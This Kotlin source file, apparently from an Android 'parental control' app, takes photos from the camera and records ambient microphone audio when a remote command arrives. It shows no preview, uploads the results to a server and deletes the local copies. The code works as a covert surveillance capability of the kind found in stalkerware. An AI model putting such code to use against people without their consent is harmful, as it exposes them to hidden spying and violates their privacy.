package com.parentalcontrol.app

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.parentalcontrol.app.api.ApiClient
import java.io.File
import java.io.FileOutputStream

object RemoteCaptureManager {
    private const val TAG = "RemoteCapture"

    // ─── Camera Capture ─────────────────────────────────────────────────

    fun capturePhoto(context: Context, useFront: Boolean = true, commandId: String? = null, callback: ((Boolean) -> Unit)? = null) {
        Thread {
            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = findCamera(cameraManager, useFront)
                if (cameraId == null) {
                    Log.e(TAG, "No ${if (useFront) "front" else "back"} camera found")
                    callback?.invoke(false)
                    return@Thread
                }

                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val sizes = map?.getOutputSizes(ImageFormat.JPEG)
                // Pick a reasonable resolution
                val size = sizes?.firstOrNull { it.width <= 1280 } ?: sizes?.lastOrNull()
                if (size == null) {
                    Log.e(TAG, "No supported image sizes")
                    callback?.invoke(false)
                    return@Thread
                }

                val handlerThread = HandlerThread("CameraCapture")
                handlerThread.start()
                val handler = Handler(handlerThread.looper)

                val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)

                imageReader.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()

                            val file = File(context.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                            FileOutputStream(file).use { it.write(bytes) }

                            // Upload — pass commandId so server links image to this command
                            val success = ApiClient.uploadScreenshot(file, commandId)
                            Log.d(TAG, "Photo uploaded: $success")
                            file.delete()
                            callback?.invoke(success)
                        } catch (e: Exception) {
                            Log.e(TAG, "Photo save failed: ${e.message}")
                            callback?.invoke(false)
                        }
                    }
                    reader.close()
                    handlerThread.quitSafely()
                }, handler)

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            captureRequest.addTarget(imageReader.surface)
                            captureRequest.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)

                            camera.createCaptureSession(
                                listOf(imageReader.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            session.capture(captureRequest.build(),
                                                object : CameraCaptureSession.CaptureCallback() {
                                                    override fun onCaptureCompleted(
                                                        session: CameraCaptureSession,
                                                        request: CaptureRequest,
                                                        result: TotalCaptureResult
                                                    ) {
                                                        Log.d(TAG, "Photo captured")
                                                        camera.close()
                                                    }
                                                }, handler)
                                        } catch (e: Exception) {
                                            Log.e(TAG, "Capture failed: ${e.message}")
                                            camera.close()
                                            callback?.invoke(false)
                                        }
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        Log.e(TAG, "Camera session config failed")
                                        camera.close()
                                        callback?.invoke(false)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            Log.e(TAG, "Camera session creation failed: ${e.message}")
                            camera.close()
                            callback?.invoke(false)
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        Log.e(TAG, "Camera error: $error")
                        camera.close()
                        callback?.invoke(false)
                    }
                }, handler)

            } catch (e: SecurityException) {
                Log.e(TAG, "Camera permission denied: ${e.message}")
                callback?.invoke(false)
            } catch (e: Exception) {
                Log.e(TAG, "Camera error: ${e.message}")
                callback?.invoke(false)
            }
        }.start()
    }

    private fun findCamera(manager: CameraManager, front: Boolean): String? {
        val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT
                     else CameraCharacteristics.LENS_FACING_BACK
        for (id in manager.cameraIdList) {
            val chars = manager.getCameraCharacteristics(id)
            if (chars.get(CameraCharacteristics.LENS_FACING) == facing) return id
        }
        return manager.cameraIdList.firstOrNull()
    }

    // ─── Ambient Audio Recording ────────────────────────────────────────

    fun recordAudio(context: Context, durationSeconds: Int = 30, commandId: String? = null, callback: ((Boolean) -> Unit)? = null) {
        Thread {
            var recorder: MediaRecorder? = null
            try {
                val file = File(context.cacheDir, "audio_${System.currentTimeMillis()}.m4a")

                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(128000)
                    setAudioSamplingRate(44100)
                    setOutputFile(file.absolutePath)
                    setMaxDuration(durationSeconds * 1000)
                    prepare()
                    start()
                }

                Log.d(TAG, "Recording audio for ${durationSeconds}s...")
                Thread.sleep(durationSeconds * 1000L)

                try {
                    recorder.stop()
                    recorder.release()
                } catch (e: Exception) {
                    Log.e(TAG, "Recorder stop error: ${e.message}")
                }
                recorder = null

                Log.d(TAG, "Recording complete, uploading...")

                // Upload as media file — pass commandId to link audio to command
                val success = ApiClient.uploadAudioFile(file, commandId)
                Log.d(TAG, "Audio uploaded: $success")
                file.delete()
                callback?.invoke(success)

            } catch (e: SecurityException) {
                Log.e(TAG, "Audio permission denied: ${e.message}")
                callback?.invoke(false)
            } catch (e: Exception) {
                Log.e(TAG, "Audio recording error: ${e.message}")
                try { recorder?.release() } catch (_: Exception) {}
                callback?.invoke(false)
            }
        }.start()
    }
}
